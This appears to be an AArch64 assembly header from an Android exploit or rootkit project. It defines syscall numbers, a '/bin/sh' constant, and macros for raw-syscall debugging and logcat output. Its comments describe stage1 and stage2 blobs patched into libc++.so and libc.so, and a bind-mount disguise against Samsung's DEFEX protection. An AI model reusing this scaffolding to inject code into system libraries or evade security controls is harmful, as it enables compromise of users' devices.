 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

  // symbolic constants for Linux/AArch64

  .equ BINSH,                0x0068732F6E69622F

  .equ BUFSIZ,               64
  .equ NULL,                  0
  .equ SIGCHLD,              17

  // sched.h
  .equ CSIGNAL,              0x000000FF // signal mask to be sent at exit
  .equ CLONE_VM,             0x00000100 // set if VM shared between processes
  .equ CLONE_FS,             0x00000200 // set if fs info shared between processes
  .equ CLONE_FILES,          0x00000400 // set if open files shared between processes
  .equ CLONE_SIGHAND,        0x00000800 // set if signal handlers and blocked signals shared
  .equ CLONE_PTRACE,         0x00002000 // set if we want to let tracing continue on the child too
  .equ CLONE_VFORK,          0x00004000 // set if the parent wants the child to wake it up on mm_release
  .equ CLONE_PARENT,         0x00008000 // set if we want to have the same parent as the cloner
  .equ CLONE_THREAD,         0x00010000 // Same thread group?
  .equ CLONE_NEWNS,          0x00020000 // New mount namespace group
  .equ CLONE_SYSVSEM,        0x00040000 // share system V SEM_UNDO semantics
  .equ CLONE_SETTLS,         0x00080000 // create a new TLS for the child
  .equ CLONE_PARENT_SETTID,  0x00100000 // set the TID in the parent
  .equ CLONE_CHILD_CLEARTID, 0x00200000 // clear the TID in the child
  .equ CLONE_DETACHED,       0x00400000 // Unused, ignored
  .equ CLONE_UNTRACED,       0x00800000 // set if the tracing process can't force CLONE_PTRACE
  .equ CLONE_CHILD_SETTID,   0x01000000 // set the TID in the child
  .equ CLONE_NEWCGROUP,      0x02000000 // New cgroup namespace
  .equ CLONE_NEWUTS,         0x04000000 // New utsname namespace
  .equ CLONE_NEWIPC,         0x08000000 // New ipc namespace
  .equ CLONE_NEWUSER,        0x10000000 // New user namespace
  .equ CLONE_NEWPID,         0x20000000 // New pid namespace
  .equ CLONE_NEWNET,         0x40000000 // New network namespace
  .equ CLONE_IO,             0x80000000 // Clone io context

  // fcntl.h
  .equ O_ACCMODE, 00000003
  .equ O_RDONLY,  00000000
  .equ O_WRONLY,  00000001
  .equ O_RDWR,    00000002
  .equ O_CREAT,   00000100
  .equ O_EXCL,    00000200
  .equ O_NOCTTY,  00000400
  .equ O_TRUNC,   00001000
  .equ O_APPEND,  00002000
  .equ O_NONBLOCK,00004000
  .equ O_CLOEXEC, 02000000

  .equ SHUT_RDWR,            2

  .equ STDIN_FILENO,         0
  .equ STDOUT_FILENO,        1
  .equ STDERR_FILENO,        2

  .equ AF_UNIX,              1
  .equ AF_INET,              2
  .equ SOCK_STREAM,          1
  .equ SOCK_DGRAM,           2
  .equ SOCK_CLOEXEC,   0x80000
  .equ IPPROTO_IP,           0

  // epoll.h
  .equ EPOLLIN,              0x001
  .equ EPOLLPRI,             0x002
  .equ EPOLLOUT,             0x004
  .equ EPOLLERR,             0x008
  .equ EPOLLHUP,             0x010
  .equ EPOLLRDNORM,          0x040
  .equ EPOLLRDBAND,          0x080
  .equ EPOLLWRNORM,          0x100
  .equ EPOLLWRBAND,          0x200
  .equ EPOLLMSG,             0x400

  .equ EPOLLEXCLUSIVE,       1 << 28
  .equ EPOLLWAKEUP,          1 << 29
  .equ EPOLLONESHOT,         1 << 30
  .equ EPOLLET,              1 << 31

  .equ EPOLL_CTL_ADD,        1
  .equ EPOLL_CTL_DEL,        2
  .equ EPOLL_CTL_MOD,        3

  // Linux/AArch64 system calls
  .equ SYS_epoll_create1,   20
  .equ SYS_epoll_ctl,       21
  .equ SYS_epoll_pwait,     22
  .equ SYS_dup3,            24
  .equ SYS_fcntl,           25
  .equ SYS_mount,           40
  .equ SYS_statfs,          43
  .equ SYS_faccessat,       48
  .equ SYS_chroot,          51
  .equ SYS_fchmodat,        53
  .equ SYS_openat,          56
  .equ SYS_close,           57
  .equ SYS_pipe2,           59
  .equ SYS_read,            63
  .equ SYS_write,           64
  .equ SYS_writev,          66
  .equ SYS_pselect6,        72
  .equ SYS_ppoll,           73
  .equ SYS_splice,          76
  .equ SYS_exit,            93
  .equ SYS_waitid,          95
  .equ SYS_unshare,         97
  .equ SYS_futex,           98
  .equ SYS_kill,           129
  .equ SYS_reboot,         142
  .equ SYS_setuid,         146
  .equ SYS_setsid,         157
  .equ SYS_uname,          160
  .equ SYS_clock_gettime,   113
  .equ SYS_getpid,         172
  .equ SYS_getppid,        173
  .equ SYS_getuid,         174
  .equ SYS_getgid,         176
  .equ SYS_gettid,         178
  .equ SYS_socket,         198
  .equ SYS_bind,           200
  .equ SYS_listen,         201
  .equ SYS_accept,         202
  .equ SYS_connect,        203
  .equ SYS_sendto,         206
  .equ SYS_recvfrom,       207
  .equ SYS_setsockopt,     208
  .equ SYS_getsockopt,     209
  .equ SYS_shutdown,       210
  .equ SYS_munmap,         215
  .equ SYS_clone,          220
  .equ SYS_execve,         221
  .equ SYS_mmap,           222
  .equ SYS_mprotect,       226
  .equ SYS_wait4,          260
  .equ SYS_getrandom,      278
  .equ SYS_memfd_create,   279
  .equ SYS_access,        1033
  .equ SYS_init_module,    105
  .equ SYS_lseek,           62
  .equ SYS_readlinkat,      78
  .equ SYS_finit_module,   273

  // logd wire format (see logdbg macro): MAIN buffer, INFO priority
  .equ LOG_ID_MAIN,          0
  .equ ANDROID_LOG_INFO,     4

  .equ EAGAIN,              11
  .equ SEEK_DATA,            3
  .equ MAP_SHARED,         0x1
  .equ MAP_PRIVATE,        0x2
  .equ PROT_READ,          0x1
  .equ PROT_WRITE,         0x2
  .equ PROT_EXEC,          0x4

  // mount.h (for the DEFEX bind-mount disguise in stage2)
  .equ MS_BIND,            4096
  .equ MS_REC,            16384
  .equ MS_PRIVATE,       262144

  // load a 64-bit immediate using MOV
  .macro movq Xn, imm
      movz    \Xn,  \imm & 0xFFFF
      movk    \Xn, (\imm >> 16) & 0xFFFF, lsl 16
      movk    \Xn, (\imm >> 32) & 0xFFFF, lsl 32
      movk    \Xn, (\imm >> 48) & 0xFFFF, lsl 48
  .endm

  // load a 32-bit immediate using MOV
  .macro movl Wn, imm
      movz    \Wn,  \imm & 0xFFFF
      movk    \Wn, (\imm >> 16) & 0xFFFF, lsl 16
  .endm

  // simulate a push operation
  .macro push Rn:req
      str     \Rn, [sp, -16]
  .endm

  // simulate a pop operation
  .macro pop R:req
      ldr     \Rn, [sp], 16
  .endm

// Save x0 to filename for debugging.
.macro debug filename
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    mov x26, x0

    mov x0, -100
    adr x1, \filename
    movl x2, (O_CREAT|O_EXCL|O_CLOEXEC|O_WRONLY)
    mov x3, (0777)
    mov x8, #SYS_openat
    svc 0

    mov x27, x0

    str x26, [sp, #-32]
    sub x1, sp, 32
    movl x2, 8
    mov x8, #SYS_write
    svc 0

    mov x0, x27
    mov x8, #SYS_close
    svc 0

    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
.endm

// Send a static debug string to logcat (MAIN buffer, INFO, tag "dfdbg").
// Raw syscalls only: socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC) +
// sendto(/dev/socket/logdw) carrying an android_log_header_t datagram
// (id:u8 | tid:u16 | tv_sec:u32 | tv_nsec:u32, then prio:u8 | tag | msg),
// the same bytes liblog would emit; logd takes uid/pid from the socket
// credentials. Every domain may write to logd (write_logd(domain)), unlike
// /dev file markers whose VALUES are unreadable under SELinux.
// All failures are silently ignored; all registers preserved.
//
// Usage: logdbg msg_label, dwpath_label, tag_label (all .asciz, and all
// must live in the SAME blob as the call site: stage1 and stage2 blobs are
// patched into different files (libc++.so / libc.so), so PC-relative adr
// cannot cross the blob boundary).

// To enable logcat, define DEBUG_LOG.
//.equ DEBUG_LOG 1

.ifdef DEBUG_LOG
.macro logdbg msglabel, dwpath, taglbl
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    adr x26, \msglabel

    mov x0, #AF_UNIX
    movl w1, (SOCK_DGRAM|SOCK_CLOEXEC)
    mov x2, xzr
    mov x8, #SYS_socket
    svc 0
    tbnz w0, #31, 2f
    mov x9, x0                    // fd

    sub sp, sp, #304              // datagram @+0, sockaddr @+256, timespec @+288
    mov x28, sp                   // datagram base (SP unusable in SUB-reg)

    // sockaddr_un: family + "/dev/socket/logdw" (18 bytes, addrlen 20)
    mov w5, #AF_UNIX
    strh w5, [sp, #256]
    adr x7, \dwpath
    add x6, sp, #258
    ldr x5, [x7], #8
    str x5, [x6], #8
    ldr x5, [x7], #8
    str x5, [x6], #8
    ldrh w5, [x7]
    strh w5, [x6]

    // header: id | tid | tv_sec | tv_nsec
    strb wzr, [sp]                // LOG_ID_MAIN
    mov x8, #SYS_gettid
    svc 0
    strh w0, [sp, #1]
    mov x0, xzr                   // CLOCK_REALTIME
    add x1, sp, #288
    mov x8, #SYS_clock_gettime
    svc 0
    ldr w8, [sp, #288]
    str w8, [sp, #3]
    ldr w8, [sp, #296]
    str w8, [sp, #7]

    // payload: prio | tag | msg
    mov w5, #ANDROID_LOG_INFO
    strb w5, [sp, #11]
    adr x7, \taglbl
    add x6, sp, #12
    ldr x5, [x7]                  // "dfdbg\0" + 2 slack bytes (stack, safe)
    str x5, [x6]
    add x6, x6, #6
    mov x7, x26
    mov x27, xzr
    // NOTE: plain numeric local labels (redefinable; b/f = nearest).
    // \@-suffixed names do NOT work here (assembled into self-loops).
1:
    ldrb w5, [x7], #1
    strb w5, [x6], #1
    add x27, x27, #1
    cbnz w5, 1b

    // sendto(fd, sp, x6-x28, 0, sp+256, 20); close(fd)
    mov x0, x9
    add x1, sp, #0
    sub x2, x6, x28
    mov x3, xzr
    add x4, sp, #256
    mov x5, #20
    mov x8, #SYS_sendto
    svc 0
    mov x0, x9
    mov x8, #SYS_close
    svc 0

    add sp, sp, #304
2:
    ldr x30, [sp], #16
    ldp x28, x29, [sp], #16
    ldp x26, x27, [sp], #16
    ldp x8, x9, [sp], #16
    ldp x6, x7, [sp], #16
    ldp x4, x5, [sp], #16
    ldp x2, x3, [sp], #16
    ldp x0, x1, [sp], #16
.endm
.else
.macro logdbg msglabel, dwpath, taglbl
.endm
.endif

.macro create_mark filename
    mov x0, -100
    adr x1, \filename
    movl x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov x3, xzr
    mov x8, #SYS_openat
    svc 0
.endm
